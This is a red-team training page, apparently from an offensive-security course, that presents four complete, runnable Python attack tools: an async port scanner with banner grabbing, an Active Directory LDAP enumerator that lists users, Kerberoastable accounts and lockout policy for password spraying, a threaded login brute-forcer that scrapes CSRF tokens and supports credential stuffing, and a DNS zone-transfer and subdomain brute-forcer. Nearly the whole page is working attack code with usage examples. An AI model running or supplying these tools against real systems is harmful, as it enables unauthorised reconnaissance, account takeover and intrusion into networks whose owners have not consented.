---
layout: training-page
title: "Python Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - python
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-python-offensive-tools"
render_with_liquid: false
---

# Python Offensive Tools

Four complete, standalone Python 3.11+ programs. Each is a runnable file with imports, argument
parsing, and a `if __name__ == "__main__":` guard. Inline comments explain every significant step.

---

## Program 1: Async Port Scanner with Banner Grabbing

**File:** `async_scanner.py`

Concurrently probes any port range using `asyncio.open_connection`. Caps parallelism with
`asyncio.Semaphore`. Grabs up to 256 bytes of banner data within a 1.5-second window, then
writes results to both stdout (table) and a JSON file containing `port`, `banner`, and `timestamp`.

**Usage:**

```
python3 async_scanner.py -t 192.168.1.1 -p 1-1024,3389 -c 200 -o scan.json
python3 async_scanner.py -t 10.0.0.5 -p 22,80,443,8080-8090 -o results.json
```

```python
#!/usr/bin/env python3
"""
async_scanner.py — Async TCP port scanner with banner grabbing.
Requires: Python 3.11+  (stdlib only — no third-party deps)

Features:
  - asyncio.open_connection for fully non-blocking TCP probes
  - asyncio.Semaphore caps peak concurrency to avoid OS fd limits
  - 1.5-second banner read timeout per port
  - Port spec parser handles "22", "80,443", "1-1024", and mixed combos
  - Results written as JSON: [{port, banner, timestamp}]
"""

import asyncio
import argparse
import datetime
import json
import sys


# ── Constants ─────────────────────────────────────────────────────────────────

BANNER_SIZE    = 256     # bytes to read per banner
BANNER_TIMEOUT = 1.5     # seconds before giving up on banner data
CONNECT_TIMEOUT = 3.0    # seconds for TCP handshake


# ── Banner grabbing ───────────────────────────────────────────────────────────

async def grab_banner(reader: asyncio.StreamReader) -> bytes:
    """
    Read up to BANNER_SIZE bytes within BANNER_TIMEOUT seconds.
    Returns empty bytes if the service sends nothing or the timeout fires.
    """
    try:
        return await asyncio.wait_for(reader.read(BANNER_SIZE), timeout=BANNER_TIMEOUT)
    except (asyncio.TimeoutError, ConnectionResetError, OSError):
        return b""


# ── Single port probe ─────────────────────────────────────────────────────────

async def probe_port(host: str, port: int, sem: asyncio.Semaphore) -> dict | None:
    """
    Attempt a TCP connection to host:port under the semaphore.
    Returns a result dict on success, None when the port is closed/filtered.
    """
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=CONNECT_TIMEOUT,
            )
        except (OSError, asyncio.TimeoutError):
            return None

        # Connected — grab the service banner before closing
        raw = await grab_banner(reader)
        banner = raw.decode(errors="replace").strip()

        writer.close()
        try:
            await writer.wait_closed()
        except OSError:
            pass

        return {
            "port":      port,
            "banner":    banner[:200],   # cap at 200 chars for clean output
            "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
        }


# ── Port range parsing ────────────────────────────────────────────────────────

def parse_port_range(spec: str) -> list[int]:
    """
    Parse a composite port spec such as '1-1024,3389,8080-8090'.
    Supports single ports, dash-ranges, and comma-separated combinations.
    Returns a sorted, deduplicated list of port integers.

    Examples:
        '22'           → [22]
        '80,443'       → [80, 443]
        '1-1024'       → [1, 2, ..., 1024]
        '1-1024,3389'  → [1, 2, ..., 1024, 3389]
    """
    ports: set[int] = set()
    for segment in spec.split(","):
        segment = segment.strip()
        if "-" in segment:
            lo_str, hi_str = segment.split("-", 1)
            lo, hi = int(lo_str), int(hi_str)
            if lo < 1 or hi > 65535 or lo > hi:
                raise ValueError(f"Invalid port range: {segment}")
            ports.update(range(lo, hi + 1))
        else:
            p = int(segment)
            if not (1 <= p <= 65535):
                raise ValueError(f"Invalid port number: {segment}")
            ports.add(p)
    return sorted(ports)


# ── Output helpers ────────────────────────────────────────────────────────────

def print_table(results: list[dict]) -> None:
    """Print open ports as a formatted table to stdout."""
    if not results:
        print("No open ports found.")
        return
    print(f"\n{'PORT':<8} {'BANNER'}")
    print("-" * 70)
    for r in results:
        preview = r["banner"][:60] or "(no banner)"
        print(f"{r['port']:<8} {preview}")


def write_json(path: str, results: list[dict]) -> None:
    """Write results as a JSON array to the specified file."""
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    print(f"[+] JSON results written to {path}")


# ── Main scan coroutine ───────────────────────────────────────────────────────

async def run_scan(host: str, ports: list[int], concurrency: int) -> list[dict]:
    """
    Schedule all port probes concurrently and collect open-port results.
    Progress is printed every 100 completions to avoid flooding the terminal.
    """
    sem = asyncio.Semaphore(concurrency)
    tasks = [probe_port(host, p, sem) for p in ports]

    open_ports: list[dict] = []
    total = len(tasks)
    completed = 0

    for coro in asyncio.as_completed(tasks):
        result = await coro
        completed += 1

        if completed % 100 == 0 or completed == total:
            print(f"\r  Probed {completed}/{total} ports …", end="", flush=True)

        if result is not None:
            open_ports.append(result)
            # Print discovered port immediately so operator sees live results
            preview = result["banner"][:60] or "(no banner)"
            print(f"\n  [OPEN] {host}:{result['port']}  {preview}")

    print()   # newline after final progress line
    return sorted(open_ports, key=lambda r: r["port"])


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Async TCP port scanner with banner grabbing (asyncio, Python 3.11+)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("-t", "--target",
                   required=True,
                   help="Target IP address or hostname")
    p.add_argument("-p", "--ports",
                   default="1-1024",
                   help="Port spec: '22', '80,443', '1-1024', or '1-1024,3389,8080-8090'")
    p.add_argument("-c", "--concurrency",
                   type=int, default=200,
                   help="Maximum simultaneous TCP connections (asyncio.Semaphore)")
    p.add_argument("-o", "--output",
                   default="scan_results.json",
                   help="JSON output file path")
    return p


def main() -> None:
    args = build_arg_parser().parse_args()

    try:
        ports = parse_port_range(args.ports)
    except ValueError as exc:
        print(f"[-] Bad port spec: {exc}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Target:      {args.target}")
    print(f"[*] Ports:       {args.ports}  ({len(ports)} total)")
    print(f"[*] Concurrency: {args.concurrency}")
    print(f"[*] Output:      {args.output}")

    started = datetime.datetime.now(datetime.UTC)
    results = asyncio.run(run_scan(args.target, ports, args.concurrency))
    elapsed = (datetime.datetime.now(datetime.UTC) - started).total_seconds()

    print_table(results)
    print(f"\n[+] Scan complete — {len(results)} open port(s) in {elapsed:.1f}s")
    write_json(args.output, results)


if __name__ == "__main__":
    main()
```

---

## Program 2: LDAP Enumeration Tool

**File:** `ldap_enum.py`

Connects to an Active Directory domain controller using `ldap3`. Supports both anonymous and
authenticated binds (NTLM for `DOMAIN\user` format, SIMPLE for DN format). Enumerates users,
computers, Kerberoastable SPNs, and the domain password policy. All results are written as JSON.

**Install:**

```
pip install ldap3
```

**Usage:**

```
# Anonymous bind
python3 ldap_enum.py --host 192.168.1.10 --base-dn "DC=corp,DC=local"

# NTLM authenticated bind
python3 ldap_enum.py --host 192.168.1.10 \
    --user "CORP\jdoe" --password "Password1!" \
    --base-dn "DC=corp,DC=local" --output enum.json
```

```python
#!/usr/bin/env python3
"""
ldap_enum.py — LDAP/Active Directory enumeration tool.
Requires: pip install ldap3

Enumerates:
  - Users (sAMAccountName, memberOf, lastLogonTimestamp, pwdLastSet, userAccountControl)
  - Computers (objectClass=computer)
  - Kerberoastable accounts (servicePrincipalName=*)
  - Domain password policy (objectClass=domain)
"""

import argparse
import datetime
import json
import sys
from typing import Any

from ldap3 import Server, Connection, ALL, SUBTREE, NTLM, SIMPLE
import ldap3.core.exceptions as ldap_exc


# ── Helpers ───────────────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.datetime.now(datetime.UTC).isoformat()


# ── Connection factory ────────────────────────────────────────────────────────

def ldap_connect(host: str, user: str | None, password: str | None) -> Connection:
    """
    Create an ldap3 Connection. Chooses auth method based on credentials:
      - No user/pass  → anonymous bind (null session)
      - DOMAIN\\user  → NTLM authentication
      - user@domain or plain DN → SIMPLE bind

    Raises ldap3.core.exceptions.LDAPException on failure.
    """
    server = Server(host, get_info=ALL, connect_timeout=10)

    if user and password:
        if "\\" in user:
            auth = NTLM
        else:
            auth = SIMPLE
        conn = Connection(
            server,
            user=user,
            password=password,
            authentication=auth,
            auto_bind=True,
        )
    else:
        # Anonymous — works when null sessions are permitted
        conn = Connection(server, auto_bind=True)

    return conn


# ── Paged search helper ───────────────────────────────────────────────────────

def ldap_search(
    conn: Connection,
    base_dn: str,
    search_filter: str,
    attributes: list[str],
) -> list[dict[str, Any]]:
    """
    Execute a paged LDAP search (200 entries per page) and return results as
    a list of plain dicts with string-serialised values for JSON compatibility.
    """
    conn.search(
        search_base=base_dn,
        search_filter=search_filter,
        search_scope=SUBTREE,
        attributes=attributes,
        paged_size=200,
    )

    results: list[dict[str, Any]] = []
    for entry in conn.entries:
        record: dict[str, Any] = {"dn": entry.entry_dn}
        for attr in attributes:
            try:
                val = entry[attr].value
                # Coerce datetimes to ISO strings so json.dump doesn't choke
                if isinstance(val, datetime.datetime):
                    val = val.isoformat()
                elif isinstance(val, list):
                    val = [
                        v.isoformat() if isinstance(v, datetime.datetime) else v
                        for v in val
                    ]
                record[attr] = val
            except ldap_exc.LDAPAttributeError:
                record[attr] = None
        results.append(record)
    return results


# ── Enumeration routines ──────────────────────────────────────────────────────

def enum_users(conn: Connection, base_dn: str) -> list[dict]:
    """
    Enumerate user accounts with attributes relevant to red team analysis:
    account name, group memberships, last logon, password age, and UAC flags.
    UAC flag 2 = ACCOUNTDISABLE; flag 65536 = DONT_EXPIRE_PASSWORD.
    """
    print("[*] Enumerating users (objectClass=user)...")
    return ldap_search(
        conn, base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user))",
        attributes=[
            "sAMAccountName",
            "displayName",
            "memberOf",
            "lastLogonTimestamp",
            "pwdLastSet",
            "userAccountControl",
            "mail",
            "description",
        ],
    )


def enum_computers(conn: Connection, base_dn: str) -> list[dict]:
    """Enumerate computer accounts — workstations and servers."""
    print("[*] Enumerating computers (objectClass=computer)...")
    return ldap_search(
        conn, base_dn,
        search_filter="(objectClass=computer)",
        attributes=[
            "cn",
            "dNSHostName",
            "operatingSystem",
            "operatingSystemVersion",
            "lastLogonTimestamp",
        ],
    )


def enum_spns(conn: Connection, base_dn: str) -> list[dict]:
    """
    Find user accounts with ServicePrincipalNames set — Kerberoasting candidates.
    Excludes machine accounts (sAMAccountName ending with '$').
    An attacker requests a TGS for each SPN and cracks the ticket offline with
    tools such as hashcat or john.
    """
    print("[*] Enumerating SPNs (Kerberoasting candidates)...")
    return ldap_search(
        conn, base_dn,
        search_filter=(
            "(&(servicePrincipalName=*)(objectClass=user)(!(sAMAccountName=*$)))"
        ),
        attributes=[
            "sAMAccountName",
            "servicePrincipalName",
            "memberOf",
            "pwdLastSet",
            "lastLogonTimestamp",
            "userAccountControl",
        ],
    )


def enum_password_policy(conn: Connection, base_dn: str) -> list[dict]:
    """
    Retrieve the default domain password policy from the domain root object.
    Key attributes for attack planning:
      lockoutThreshold — 0 means no lockout (spray freely)
      minPwdLength     — informs password guessing
    """
    print("[*] Enumerating domain password policy (objectClass=domain)...")
    return ldap_search(
        conn, base_dn,
        search_filter="(objectClass=domainDNS)",
        attributes=[
            "minPwdLength",
            "pwdHistoryLength",
            "maxPwdAge",
            "minPwdAge",
            "lockoutThreshold",
            "lockoutDuration",
            "lockOutObservationWindow",
        ],
    )


# ── Output ────────────────────────────────────────────────────────────────────

def save_json(data: dict, path: str) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] JSON report saved to {path}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="LDAP/Active Directory enumeration tool (ldap3)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--host",
                   required=True,
                   help="DC IP address or hostname")
    p.add_argument("--user",
                   default=None,
                   help="Bind user: 'DOMAIN\\\\user' for NTLM, DN for SIMPLE, omit for anonymous")
    p.add_argument("--password",
                   default=None,
                   help="Bind password (omit for anonymous)")
    p.add_argument("--base-dn",
                   required=True,
                   dest="base_dn",
                   help="LDAP base DN, e.g. DC=corp,DC=local")
    p.add_argument("--output",
                   default="ldap_enum.json",
                   help="JSON output file path")
    return p


def main() -> None:
    args = build_arg_parser().parse_args()
    bind_type = "authenticated" if args.user else "anonymous"

    print(f"[*] Connecting to {args.host} ({bind_type} bind)...")
    try:
        conn = ldap_connect(args.host, args.user, args.password)
    except ldap_exc.LDAPException as exc:
        print(f"[-] LDAP connection failed: {exc}", file=sys.stderr)
        sys.exit(1)

    report: dict[str, Any] = {
        "meta": {
            "host":      args.host,
            "base_dn":   args.base_dn,
            "bind_user": args.user or "anonymous",
            "timestamp": now_iso(),
        },
        "users":           enum_users(conn, args.base_dn),
        "computers":       enum_computers(conn, args.base_dn),
        "kerberoastable":  enum_spns(conn, args.base_dn),
        "password_policy": enum_password_policy(conn, args.base_dn),
    }

    conn.unbind()

    # Summary to terminal
    print()
    print(f"[+] Users:          {len(report['users'])}")
    print(f"[+] Computers:      {len(report['computers'])}")
    print(f"[+] Kerberoastable: {len(report['kerberoastable'])}")
    for acct in report["kerberoastable"]:
        sam  = acct.get("sAMAccountName", "?")
        spns = acct.get("servicePrincipalName", [])
        print(f"    {sam:<30}  SPNs={spns}")

    save_json(report, args.output)


if __name__ == "__main__":
    main()
```

---

## Program 3: HTTP Login Brute-Forcer with CSRF

**File:** `http_bruteforce.py`

Brute-forces form-based logins with full CSRF token support. Uses `BeautifulSoup4` to scrape token
fields from the login page before each attempt, maintaining per-thread `requests.Session` objects
for correct cookie isolation. Supports both single-username and username-file modes.

**Install:**

```
pip install requests beautifulsoup4 lxml
```

**Usage:**

```
# Single username, detect success by string
python3 http_bruteforce.py \
  --url https://target.local/login \
  --user-field username --pass-field password \
  --username admin \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --success-string "Welcome" --failure-string "Invalid" \
  --threads 10 --delay 0.3 --output hits.json

# Username list mode
python3 http_bruteforce.py \
  --url https://target.local/login \
  --user-field email --pass-field pwd \
  --user-file users.txt --wordlist passwords.txt \
  --success-string "Dashboard" --threads 5
```

```python
#!/usr/bin/env python3
"""
http_bruteforce.py — Threaded HTTP form login brute-forcer with CSRF support.
Requires: pip install requests beautifulsoup4 lxml

Features:
  - Per-thread requests.Session (cookie isolation)
  - CSRF token scraping with BeautifulSoup (searches for input[name*=token/csrf/_token])
  - --user-file for credential-stuffing with a username list
  - --failure-string and --success-string for flexible detection
  - --proxy for routing through Burp or a SOCKS proxy
  - JSON output of discovered credentials
"""

import argparse
import json
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Session factory ───────────────────────────────────────────────────────────

def make_session(proxy: str | None = None) -> requests.Session:
    """
    Build a requests.Session with retry back-off and optional proxy routing.
    Each thread creates its own session to keep cookies completely isolated.
    """
    session = requests.Session()
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    session.mount("http://",  HTTPAdapter(max_retries=retry))
    session.mount("https://", HTTPAdapter(max_retries=retry))
    session.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


# ── CSRF token scraping ───────────────────────────────────────────────────────

CSRF_PATTERNS = ["csrf", "token", "_token", "authenticity_token", "nonce"]


def fetch_hidden_fields(session: requests.Session, login_url: str) -> dict[str, str]:
    """
    GET the login page and collect all hidden <input> fields.
    Detects CSRF tokens by matching field names against CSRF_PATTERNS.
    Returns a dict of {field_name: field_value} for all hidden inputs.
    """
    try:
        resp = session.get(login_url, verify=False, timeout=10)
        resp.raise_for_status()
    except requests.RequestException:
        return {}

    soup = BeautifulSoup(resp.text, "lxml")
    hidden: dict[str, str] = {}
    for inp in soup.find_all("input", {"type": "hidden"}):
        name  = inp.get("name",  "")
        value = inp.get("value", "")
        if name:
            hidden[name] = value

    csrf_fields = [k for k in hidden if any(p in k.lower() for p in CSRF_PATTERNS)]
    if csrf_fields:
        pass   # found at least one; caller uses full hidden dict

    return hidden


# ── Single login attempt ──────────────────────────────────────────────────────

def attempt_login(
    url:            str,
    user_field:     str,
    pass_field:     str,
    username:       str,
    password:       str,
    success_string: str,
    failure_string: str,
    proxy:          str | None,
    delay:          float,
) -> tuple[str, str, bool]:
    """
    Submit one username/password pair.
    Returns (username, password, True) on confirmed success.
    Detection logic: presence of success_string OR absence of failure_string.
    """
    session = make_session(proxy)
    hidden  = fetch_hidden_fields(session, url)

    payload = dict(hidden)
    payload[user_field] = username
    payload[pass_field] = password

    if delay > 0:
        time.sleep(delay)

    try:
        resp = session.post(
            url, data=payload,
            verify=False, timeout=15, allow_redirects=True,
        )
        body = resp.text
    except requests.RequestException:
        return username, password, False

    if success_string and success_string in body:
        return username, password, True
    if failure_string and failure_string not in body:
        # Response does not contain the failure marker — likely success
        return username, password, True

    return username, password, False


# ── Thread-safe print ─────────────────────────────────────────────────────────

_print_lock = threading.Lock()


def safe_print(msg: str) -> None:
    with _print_lock:
        print(msg, flush=True)


# ── Output ────────────────────────────────────────────────────────────────────

def save_hits(hits: list[dict], path: str) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(hits, fh, indent=2)
    print(f"[+] Hits saved to {path}")


# ── Brute-force engine ────────────────────────────────────────────────────────

def run_bruteforce(
    url:            str,
    user_field:     str,
    pass_field:     str,
    usernames:      list[str],
    wordlist_path:  str,
    success_string: str,
    failure_string: str,
    num_threads:    int,
    delay:          float,
    proxy:          str | None,
    output:         str,
) -> list[dict]:
    """
    Enumerate all (username, password) pairs from the Cartesian product of
    usernames × wordlist entries.  Futures are submitted in bulk; discovered
    credentials are printed immediately and collected for JSON output.
    """
    try:
        with open(wordlist_path, encoding="latin-1", errors="replace") as fh:
            passwords = [line.strip() for line in fh if line.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}", file=sys.stderr)
        sys.exit(1)

    combos = [(u, p) for u in usernames for p in passwords]
    print(f"[*] URL:       {url}")
    print(f"[*] Usernames: {len(usernames)}  Passwords: {len(passwords)}")
    print(f"[*] Total:     {len(combos)} combinations")
    print(f"[*] Threads:   {num_threads}   Delay: {delay}s/thread")

    hits: list[dict] = []
    attempted = 0

    with ThreadPoolExecutor(max_workers=num_threads) as pool:
        future_to_pair = {
            pool.submit(
                attempt_login,
                url, user_field, pass_field, u, p,
                success_string, failure_string, proxy, delay,
            ): (u, p)
            for u, p in combos
        }

        for future in as_completed(future_to_pair):
            user, pwd, success = future.result()
            attempted += 1

            if attempted % 50 == 0:
                safe_print(f"  [{attempted}/{len(combos)}] last: {user}:{pwd}")

            if success:
                safe_print(f"\n[+] VALID CREDENTIAL: {user}:{pwd}\n")
                hits.append({"username": user, "password": pwd})

    return hits


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="HTTP form login brute-forcer with CSRF token support",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--url",
                   required=True,
                   help="Login form POST URL")
    p.add_argument("--user-field",
                   default="username",
                   help="HTML name attribute of the username input")
    p.add_argument("--pass-field",
                   default="password",
                   help="HTML name attribute of the password input")

    # Username source: single or file
    user_group = p.add_mutually_exclusive_group(required=True)
    user_group.add_argument("--username",
                            help="Single username to attack")
    user_group.add_argument("--user-file",
                            dest="user_file",
                            help="File containing one username per line")

    p.add_argument("--wordlist",
                   required=True,
                   help="Path to password wordlist (one password per line)")
    p.add_argument("--success-string",
                   default="",
                   help="String that appears in the response body on login success")
    p.add_argument("--failure-string",
                   default="",
                   help="String that appears in the response body on login failure")
    p.add_argument("--threads",
                   type=int, default=10,
                   help="Number of concurrent worker threads")
    p.add_argument("--delay",
                   type=float, default=0.0,
                   help="Seconds to sleep per thread between attempts (rate limiting)")
    p.add_argument("--proxy",
                   default=None,
                   help="HTTP/SOCKS proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--output",
                   default="hits.json",
                   help="JSON file to write discovered credentials to")
    return p


def main() -> None:
    args = build_arg_parser().parse_args()

    if not args.success_string and not args.failure_string:
        print("[-] Provide at least one of --success-string or --failure-string",
              file=sys.stderr)
        sys.exit(1)

    # Resolve username list
    if args.username:
        usernames = [args.username]
    else:
        try:
            with open(args.user_file, encoding="utf-8", errors="replace") as fh:
                usernames = [line.strip() for line in fh if line.strip()]
        except FileNotFoundError:
            print(f"[-] User file not found: {args.user_file}", file=sys.stderr)
            sys.exit(1)

    hits = run_bruteforce(
        url=args.url,
        user_field=args.user_field,
        pass_field=args.pass_field,
        usernames=usernames,
        wordlist_path=args.wordlist,
        success_string=args.success_string,
        failure_string=args.failure_string,
        num_threads=args.threads,
        delay=args.delay,
        proxy=args.proxy,
        output=args.output,
    )

    if hits:
        save_hits(hits, args.output)
        print(f"\n[+] {len(hits)} valid credential(s) found.")
    else:
        print("\n[-] No valid credentials found.")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## Program 4: DNS Zone Walker & Subdomain Enumerator

**File:** `dns_enum.py`

Attempts an AXFR zone transfer against all authoritative nameservers. On failure, falls back to
concurrent brute-force enumeration using a wordlist. Resolves A, AAAA, MX, TXT, CNAME, and NS
records (configurable with `--types`). Outputs timestamped JSON in the format
`{domain, records: [{name, type, value}], discovered_at}`.

**Install:**

```
pip install dnspython
```

**Usage:**

```
# AXFR attempt with brute-force fallback
python3 dns_enum.py --domain corp.local \
    --wordlist /usr/share/wordlists/subdomains.txt

# Custom resolver, specific record types, more threads
python3 dns_enum.py --domain corp.local \
    --wordlist subdomains.txt \
    --resolver 8.8.8.8 \
    --threads 50 \
    --types A,AAAA,MX,TXT,CNAME,NS \
    --output dns_results.json
```

```python
#!/usr/bin/env python3
"""
dns_enum.py — DNS zone transfer attempt + concurrent subdomain brute-forcer.
Requires: pip install dnspython

Workflow:
  1. Attempt AXFR zone transfer against all authoritative NS records
  2. On failure, fall back to brute-force with a wordlist
  3. Resolve configurable record types per discovered subdomain
  4. Write JSON: {domain, records: [{name, type, value}], discovered_at}
"""

import argparse
import datetime
import json
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import dns.exception
import dns.query
import dns.rdatatype
import dns.resolver
import dns.zone


# ── Timestamp ─────────────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.datetime.now(datetime.UTC).isoformat()


# ── Resolver factory ──────────────────────────────────────────────────────────

def make_resolver(nameserver: str | None = None) -> dns.resolver.Resolver:
    """
    Build a dns.resolver.Resolver.
    If nameserver is given, pin to that IP (bypasses /etc/resolv.conf).
    """
    resolver = dns.resolver.Resolver(configure=(nameserver is None))
    if nameserver:
        resolver.nameservers = [nameserver]
    resolver.timeout  = 3.0
    resolver.lifetime = 6.0
    return resolver


# ── Record type parsing ───────────────────────────────────────────────────────

DEFAULT_TYPES = ["A", "AAAA", "MX", "TXT", "CNAME", "NS"]


def parse_record_types(types_str: str) -> list[str]:
    """Parse a comma-separated list of DNS record type names."""
    return [t.strip().upper() for t in types_str.split(",") if t.strip()]


# ── AXFR zone transfer ────────────────────────────────────────────────────────

def try_axfr(domain: str, nameserver_ip: str | None) -> list[dict] | None:
    """
    Attempt AXFR zone transfer from all authoritative nameservers.
    Returns a list of record dicts if any NS allows the transfer, else None.

    Each record: {name: str, type: str, value: str}
    """
    print(f"[*] Attempting AXFR zone transfer for {domain} ...")

    # Discover authoritative nameservers for the domain
    try:
        resolver = make_resolver(nameserver_ip)
        ns_answer = resolver.resolve(domain, "NS")
        name_servers = [str(rd.target).rstrip(".") for rd in ns_answer]
    except dns.exception.DNSException as exc:
        print(f"  [-] NS lookup failed: {exc}")
        return None

    for ns in name_servers:
        print(f"  [*] Trying AXFR via {ns} ...")
        try:
            # dns.query.xfr() is a generator that yields DNS messages
            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=10))
        except (dns.exception.DNSException, ConnectionRefusedError, OSError) as exc:
            print(f"  [-] AXFR refused by {ns}: {exc}")
            continue

        records: list[dict] = []
        for owner_name, node in zone.nodes.items():
            fqdn = f"{owner_name}.{domain}".rstrip(".")
            for rdataset in node.rdatasets:
                rtype = dns.rdatatype.to_text(rdataset.rdtype)
                for rdata in rdataset:
                    records.append({
                        "name":  fqdn,
                        "type":  rtype,
                        "value": str(rdata),
                    })

        print(f"  [+] AXFR success via {ns} — {len(records)} records returned")
        return records

    return None


# ── Single-host brute-force resolver ─────────────────────────────────────────

def resolve_host(
    fqdn:     str,
    resolver: dns.resolver.Resolver,
    rtypes:   list[str],
) -> list[dict]:
    """
    Resolve a single FQDN for each requested record type.
    Returns a list of {name, type, value} dicts for every record found.
    Returns an empty list if the host does not exist.
    """
    results: list[dict] = []
    for rtype in rtypes:
        try:
            answers = resolver.resolve(fqdn, rtype, raise_on_no_answer=False)
            for rdata in answers:
                results.append({
                    "name":  fqdn,
                    "type":  rtype,
                    "value": str(rdata),
                })
        except (
            dns.resolver.NXDOMAIN,
            dns.resolver.NoNameservers,
            dns.exception.Timeout,
            dns.resolver.NoAnswer,
        ):
            pass    # most subdomains won't have every record type

    return results


# ── Brute-force engine ────────────────────────────────────────────────────────

_print_lock = threading.Lock()


def brute_force(
    domain:      str,
    wordlist:    str,
    resolver_ip: str | None,
    threads:     int,
    rtypes:      list[str],
) -> list[dict]:
    """
    Enumerate <word>.<domain> for each word in the wordlist using a thread pool.
    Returns a flat list of {name, type, value} dicts for all resolved records.
    """
    try:
        with open(wordlist, encoding="utf-8", errors="replace") as fh:
            words = [ln.strip() for ln in fh if ln.strip()]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Brute-forcing {len(words)} candidates with {threads} threads ...")
    resolver = make_resolver(resolver_ip)
    all_records: list[dict] = []
    attempted   = 0

    with ThreadPoolExecutor(max_workers=threads) as pool:
        future_map = {
            pool.submit(resolve_host, f"{word}.{domain}", resolver, rtypes): word
            for word in words
        }

        for future in as_completed(future_map):
            attempted += 1
            if attempted % 200 == 0:
                with _print_lock:
                    print(f"  [{attempted}/{len(words)}] ...")

            records = future.result()
            if records:
                all_records.extend(records)
                # Print each newly discovered host once
                host = records[0]["name"]
                with _print_lock:
                    a_vals = [r["value"] for r in records if r["type"] == "A"]
                    print(f"  [+] {host}  A={a_vals}")

    return all_records


# ── Output ────────────────────────────────────────────────────────────────────

def save_json(data: dict, path: str) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2)
    print(f"[+] Results saved to {path}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="DNS zone walker and subdomain enumerator (dnspython)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--domain",
                   required=True,
                   help="Target domain, e.g. corp.local")
    p.add_argument("--wordlist",
                   required=True,
                   help="Subdomain wordlist (one word per line)")
    p.add_argument("--resolver",
                   default=None,
                   help="Custom DNS resolver IP (default: system resolver)")
    p.add_argument("--threads",
                   type=int, default=30,
                   help="Worker threads for brute-force phase")
    p.add_argument("--output",
                   default="dns_enum.json",
                   help="JSON output file path")
    p.add_argument("--types",
                   default=",".join(DEFAULT_TYPES),
                   help="Comma-separated record types to resolve, e.g. A,AAAA,MX,TXT,CNAME,NS")
    return p


def main() -> None:
    args = build_arg_parser().parse_args()
    rtypes = parse_record_types(args.types)

    print(f"[*] Target domain: {args.domain}")
    print(f"[*] Record types:  {rtypes}")
    print(f"[*] Resolver:      {args.resolver or 'system default'}")

    discovered_at = now_iso()

    # Phase 1: AXFR zone transfer attempt
    axfr_records = try_axfr(args.domain, args.resolver)

    if axfr_records is not None:
        method  = "axfr"
        records = axfr_records
        print(f"[+] Zone transfer returned {len(records)} records — skipping brute-force")
    else:
        method  = "bruteforce"
        print("[-] AXFR unavailable — falling back to brute-force")
        records = brute_force(
            domain=args.domain,
            wordlist=args.wordlist,
            resolver_ip=args.resolver,
            threads=args.threads,
            rtypes=rtypes,
        )
        unique_hosts = len({r["name"] for r in records})
        print(f"[+] Brute-force complete — {unique_hosts} live hosts, {len(records)} records")

    report: dict[str, Any] = {
        "domain":       args.domain,
        "method":       method,
        "record_types": rtypes,
        "records":      records,
        "discovered_at": discovered_at,
    }

    save_json(report, args.output)


if __name__ == "__main__":
    main()
```

---

## Resources

- Python 3.11 asyncio documentation: https://docs.python.org/3.11/library/asyncio.html
- asyncio streams reference (open_connection): https://docs.python.org/3.11/library/asyncio-stream.html
- ldap3 library documentation: https://ldap3.readthedocs.io/en/latest/
- ldap3 GitHub repository: https://github.com/cannatag/ldap3
- dnspython documentation: https://www.dnspython.org/docs/latest/
- dnspython GitHub repository: https://github.com/rthalley/dnspython
- impacket (AD attack framework): https://github.com/fortra/impacket
- requests library documentation: https://requests.readthedocs.io/en/latest/
- BeautifulSoup4 documentation: https://www.crummy.com/software/BeautifulSoup/bs4/doc/
- concurrent.futures documentation: https://docs.python.org/3.11/library/concurrent.futures.html
